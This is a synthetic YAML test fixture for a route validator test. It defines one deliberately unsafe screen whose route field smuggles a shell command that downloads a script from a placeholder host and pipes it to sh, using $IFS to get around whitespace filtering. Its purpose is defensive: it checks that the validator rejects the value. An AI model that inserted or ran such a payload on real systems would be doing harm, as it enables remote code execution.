# Synthetic fixture screens.yaml — not a real product, used only by
# factory/bench/tests/profiles/ui-routes-screens.test.ts. Plants exactly one violation: a
# route containing shell/URL metacharacters (the security review's H-1 exploit shape) — must
# be rejected by SAFE_ROUTE before it ever reaches lighthouse-a11y.mjs's URL/command line.

screens:
  - id: S-pwn
    name: Unsafe route
    area: app
    route: /a;curl$IFS-sSL$IFSexample.invalid/x.sh|sh;
    states:
      - default
    mockup_states:
      - default

areas_without_screens: []
